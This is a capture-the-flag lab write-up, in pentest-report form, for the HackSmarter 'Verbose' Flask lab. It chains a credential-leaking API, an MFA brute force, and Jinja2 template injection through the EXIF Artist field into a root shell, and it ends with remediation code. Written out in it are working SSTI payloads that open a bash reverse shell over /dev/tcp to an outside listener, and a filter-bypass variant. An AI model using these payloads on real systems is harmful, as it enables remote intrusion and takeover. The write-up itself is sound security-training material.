---
layout: default
title: "Verbose (SSTI to RCE) - Hacksmarter"
---

[← Back](./)

# HackSmarter - Verbose Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-01-24</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> HackSmarter</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
- 1 Critical information disclosure vulnerability (API leaking credentials)
- 1 High-risk weak MFA implementation (brute-forceable 4-digit codes)
- 1 Critical SSTI vulnerability via EXIF metadata rendering
- Server running as root (immediate privilege escalation)

**Business Impact:** Chained exploitation of information disclosure, weak MFA, and SSTI allows attackers to gain root-level remote code execution on the server, leading to complete system compromise and data breach.

---

## Objective

You have been authorized to perform an external penetration test against a target organization. During the initial reconnaissance phase, you identified a web application that allows unrestricted public user registration.

  1. **Enumerate**: Map the application's attack surface and functionality.
  2. **Identify**: Locate exploitable vulnerabilities within the application logic or configuration.
  3. **Exploit & Escalate**: Leverage identified flaws to compromise the system, with the final goal of securing root access to the host server to demonstrate maximum impact.

## Initial Access

```bash
# Target Application
URL: http://10.1.148.204:80 (Flask application)

# Initial Action
Created a standard user account via registration
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Information Disclosure** - `/api/users/all` exposes all user credentials (CWE-200)
2. **Weak MFA Implementation** - 4-digit codes brute-forceable (CWE-307)
3. **Server-Side Template Injection** - EXIF metadata rendered via Jinja2 (CWE-1336)
4. **Insecure Server Configuration** - Application running as root (CWE-250)

**CVSS v3.1 Score for SSTI Chain:** **9.8 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network (AV:N) |
| Attack Complexity | Low (AC:L) |
| Privileges Required | Low (PR:L) |
| User Interaction | None (UI:N) |
| Scope | Unchanged (S:U) |
| Confidentiality | High (C:H) |
| Integrity | High (I:H) |
| Availability | High (A:H) |

## Enumeration Summary

### Application Analysis

**Target Endpoints Discovered:**
- `/api/users/all` - Returns all user data including plaintext passwords
- `/login` - Login with MFA protection (when enabled)
- `/admin/logo_preview?file=` - Logo preview with EXIF metadata display
- `/admin/upload_logo` - Logo upload functionality (PNG only)
- `/admin/make_admin` - User permission
- `/mfa` - MFA

**Summary:**
- **Framework:** Flask/Werkzeug with Jinja2 templating
- **Authentication:** Session-based with MFA
- **File Upload:** PNG images only, EXIF metadata extracted and displayed
- **Authorization:** Role-based (user/admin)

## Attack Chain Visualization

```
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│   User Registration │────▶│   API Info       │────▶│   Admin Creds       │
│   (Standard User)   │     │   Disclosure     │     │   Obtained          │
│                     │     │   /api/users/all │     │                     │
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
                                                                │
                                                                ▼
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│   Root Shell via    │◀────│   SSTI via EXIF  │◀────│   MFA Brute Force   │
│   Reverse Shell     │     │   Artist Field   │     │   (0001-9999)       │
│   (Server runs      │     │   in logo_preview│     │   5 threads +       │
│    as root!)        │     │                  │     │   random delay      │
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
                │
                ▼
      ┌─────────────────────┐
      │   cat /root/root.txt│
      │   FLAG CAPTURED     │
      └─────────────────────┘
```

**Attack Path Summary:**
1. **User Registration:** Create standard user account
2. **Information Disclosure:** Query `/api/users/all` to obtain admin credentials
3. **MFA Bypass:** Brute force 4-digit MFA code using Burp Intruder
4. **Admin Access:** Gain access to admin panel with logo upload and user management
5. **SSTI Discovery:** Identify EXIF metadata rendering in logo preview
6. **RCE:** Inject Jinja2 payload into EXIF Artist field for reverse shell
7. **Root Access:** Server running as root provides immediate root shell

---

## Exploitation Path

### Step 1: Information Disclosure - API Credential Leak

**Discovered `/api/users/all` endpoint exposing all user data:**

```http
GET /api/users/all HTTP/1.1
Host: 10.1.148.204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.1.148.204/admin/dashboard
Connection: keep-alive
Cookie: session=.eJyrVirKz0lVslJKTMnNzFPSUSpOLS7OzM-Lz0wBCRqkWZgmJpnpmqSZGuiamBha6CamGRvrphoYWaSaGhgbpiQlAfWUFqcWwY2oBQAlLhit.aXQNjw.brj1k9EA3pF9dV6otyQYtHEsUYM
X-PwnFox-Color: blue
Priority: u=4
```

**Response:**

```json
[
  {"email":"tony@hacksmarter.local","id":1,"mfa":null,"password":"basketball","role":"user","username":"tony"},
  {"email":"johnny@hacksmarter.local","id":2,"mfa":null,"password":"dolphin","role":"user","username":"johnny"},
  {
    "email":"admin@hacksmarter.local",
    "id":3,
    "mfa":null,
    "password":"YouWontGetThisPasswordYouNoobLOL123",
    "role":"admin",
    "username":"admin"
  },
  {"email":"student@hacksmarter.local","id":4,"mfa":null,"password":"liverpool","role":"user","username":"student"}
]
```

**Analysis:** API endpoint returns plaintext passwords for all users including admin. No authentication required.

### Step 2: MFA Brute Force

Attempted admin login but account protected by MFA (4-digit code).

**Burp Intruder Configuration:**

```http
POST /mfa HTTP/1.1
Host: 10.1.148.204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://10.1.148.204
Connection: keep-alive
Referer: http://10.1.148.204/mfa
Cookie: session=eyJtZmFfdXNlciI6ImFkbWluIiwic2Vzc2lvbl9pZCI6ImEwZjg1YWI2LTRmNTAtNDQxOC1hZjMzLWUwMjhlNTAzMWRiYiJ9.aXQLlg.jRkZcwNEVTsgYnDXu58wRHduDo8
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: blue
Priority: u=0, i

code=§1234§
```

- **Payload:** Numbers 0001-9999
- **Issue:** Server returned 500 errors under heavy load
- **Solution:** Reduced to 5 concurrent threads with random millisecond delay

**Result:** Successfully brute forced MFA code and gained admin access.

### Step 3: Admin Panel Enumeration

**Admin capabilities discovered:**
1. **Logo Upload** - Upload new site logo (PNG files only)
2. **User Permissions** - Upgrade any user's role to admin

**Logo Preview Endpoint:**

```
/admin/logo_preview?file=logo.png
```

The preview page displays:
- Image preview
- **EXIF Metadata** - specifically the "Copyright / Artist" field

### Step 4: SSTI Discovery via EXIF Metadata

**Hypothesis:** EXIF metadata is extracted and rendered through Jinja2 template without sanitization.

**SSTI Test:**

```bash
convert -size 1x1 xc:white /tmp/test.png
exiftool -Artist='{{7*7}}' /tmp/test.png
```

**Result:** Uploaded image, accessed preview - **"49" appeared** in the Artist field.

✅ **SSTI Confirmed** - Jinja2 template injection via EXIF Artist field.

### Step 5: RCE via Jinja2 lipsum Payload

**Listener Setup:**

```bash
nc -lvnp 4444
```

**Payload Creation:**

```bash
convert -size 1x1 xc:white /tmp/shell.png
exiftool -Artist='{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read() }}' /tmp/shell.png
```

**Execution:**
1. Uploaded `shell.png` with SSTI payload
2. Triggered `/admin/logo_preview?file=shell.png`
3. Received root shell on netcat listener

### Step 6: Flag Capture

```bash
──(kali㉿kali)-[~/]
└─$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.1.148.204 35700
bash: cannot set terminal process group (610): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-1-148-204:/home/ubuntu# ll /root
ll /root
total 40
drwx------  5 root root 4096 Jan 20 19:25 ./
drwxr-xr-x 22 root root 4096 Jan 23 23:54 ../
-rw-------  1 root root  145 Jan 24 00:44 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
-rw-------  1 root root   20 Jan 11 03:19 .lesshst
drwxr-xr-x  3 root root 4096 Jan 20 19:25 .local/
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root 4096 Jan 10 17:49 .ssh/
-rw-r--r--  1 root root   18 Jan 20 19:25 root.txt
drwx------  3 root root 4096 Jan 10 17:49 snap/
```

```bash
root@ip-10-1-148-204:/home/ubuntu# cat /root/root.txt
cat /root/root.txt
HSM{a3fec2e83dad}
```


> **⚠️ Note:** Server was running as root - no privilege escalation required. This is a critical misconfiguration.

---

## Flag / Objective Achieved

✅ **Objective:** Gained root shell via SSTI in EXIF metadata rendering

✅ **Flag:** Retrieved from `/root/root.txt`

---

## Alternative Payload

```bash
convert -size 1x1 xc:white /tmp/shell.png
exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/10.200.31.196/4444 0>&1\"").read()}}' /tmp/shell.png
```

**Payload Breakdown:**

| Component | Purpose |
|-----------|---------|
| `{{ }}` | Jinja2 expression tags |
| `lipsum` | Built-in Jinja2 function (lorem ipsum generator) |
| `.__globals__` | Access Python's global namespace |
| `.os` | Access the `os` module |
| `.popen("cmd")` | Execute shell command |
| `.read()` | Trigger execution and return output |

**Why lipsum?**
- It's a Python function object with `__globals__` attribute
- Often not filtered (unlike `config`, `request`, `self`)
- Provides access to imported modules like `os`

---

## Key Learnings

- **API security:** Always authenticate and authorize API endpoints - `/api/users/all` should never expose credentials
- **MFA implementation:** 4-digit codes are brute-forceable in reasonable time; use rate limiting and account lockout
- **Throttle your attacks:** Adjust threads/delays to avoid crashing the target or triggering rate limits
- **EXIF metadata in templates:** When file uploads display metadata, test all fields for injection
- **Test the correct field:** Comment field didn't work; Artist/Copyright was the injection point
- **lipsum SSTI bypass:** When `config`, `request`, `self` are filtered, use alternative objects like `lipsum`
- **Run as least privilege:** Never run web applications as root

---

## Tools Used

- **Burp Intruder** - MFA brute force with throttling
- **exiftool** - EXIF metadata manipulation
- **convert** (ImageMagick) - Create minimal PNG files
- **nc** (netcat) - Reverse shell listener

---

## Remediation

### 1. Information Disclosure in /api/users/all (CVSS: 9.1 - Critical)

**Issue:** API endpoint returns all user data including plaintext passwords without authentication.

**CWE Reference:** CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor

**Fix:**

```python
# BEFORE (Vulnerable)
@app.route('/api/users/all')
def get_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])  # Includes passwords!

# AFTER (Secure)
@app.route('/api/users/all')
@login_required
@admin_required
def get_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'username': u.username,
        'email': u.email,
        'role': u.role
        # Password explicitly excluded
    } for u in users])
```

### 2. Weak MFA Implementation (CVSS: 7.5 - High)

**Issue:** 4-digit MFA codes can be brute forced in under 10,000 attempts with no rate limiting.

**CWE Reference:** CWE-307 - Improper Restriction of Excessive Authentication Attempts

**Fix:**

```python
# Add rate limiting and account lockout
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/admin/verify-mfa', methods=['POST'])
@limiter.limit("5 per minute")  # Rate limit
def verify_mfa():
    # Check for account lockout
    if get_failed_attempts(session['user_id']) >= 5:
        return jsonify({'error': 'Account locked. Try again in 15 minutes.'}), 429

    # Use 6+ digit codes or TOTP
    # Implement exponential backoff
```

### 3. SSTI via EXIF Metadata (CVSS: 9.8 - Critical)

**Issue:** EXIF metadata from uploaded images is rendered through Jinja2 without sanitization.

**CWE Reference:** CWE-1336 - Improper Neutralization of Special Elements Used in a Template Engine

**Fix:**

```python
# BEFORE (Vulnerable)
@app.route('/admin/logo_preview')
def logo_preview():
    filename = request.args.get('file')
    metadata = extract_exif(filename)
    # Directly rendering user-controlled EXIF data in template!
    return render_template('preview.html', artist=metadata.get('Artist', 'Unknown'))

# AFTER (Secure)
from markupsafe import escape

@app.route('/admin/logo_preview')
def logo_preview():
    filename = request.args.get('file')
    metadata = extract_exif(filename)
    # Escape all user-controlled data before rendering
    safe_artist = escape(metadata.get('Artist', 'Unknown'))
    return render_template('preview.html', artist=safe_artist)
```

**Or strip EXIF data entirely:**

```python
from PIL import Image

def strip_exif(image_path):
    img = Image.open(image_path)
    data = list(img.getdata())
    img_no_exif = Image.new(img.mode, img.size)
    img_no_exif.putdata(data)
    img_no_exif.save(image_path)
```

### 4. Application Running as Root (CVSS: 7.8 - High)

**Issue:** Web application runs as root user, providing immediate root access upon RCE.

**CWE Reference:** CWE-250 - Execution with Unnecessary Privileges

**Fix:**

```bash
# Create dedicated service user
useradd -r -s /bin/false webapp

# Run application as non-root
sudo -u webapp python app.py

# Or use systemd with User= directive
[Service]
User=webapp
Group=webapp
```

---

## Failed Attempts

### Approach 1: Path Traversal in logo_preview

```
/admin/logo_preview?file=../../../etc/passwd
```

**Result:** ❌ Failed - Application strips path and only looks for filename in uploads directory

**Response:**
```
Error: File 'passwd' not found.
```

### Approach 2: SSTI via EXIF Comment Field

```bash
exiftool -Comment='{{7*7}}' /tmp/test.png
```

**Result:** ❌ Failed - Comment field not rendered in template, only Artist/Copyright displayed

### Approach 3: Direct SSTI in Filename

```bash
mv test.png '{{7*7}}.png'
```

**Result:** ❌ Failed - Filename sanitized on upload

---

## OWASP Top 10 Coverage

- **A01:2021** - Broken Access Control (unauthenticated API access, MFA bypass)
- **A02:2021** - Cryptographic Failures (plaintext password storage)
- **A03:2021** - Injection (Server-Side Template Injection)
- **A04:2021** - Insecure Design (EXIF metadata rendering without sanitization)
- **A05:2021** - Security Misconfiguration (application running as root)
- **A07:2021** - Identification and Authentication Failures (weak MFA)

---

## References

**SSTI Resources:**
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)

**EXIF Exploitation:**
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

**Tags:** `#ssti` `#jinja2` `#exif` `#file-upload` `#mfa-bypass` `#information-disclosure` `#hacksmarter`
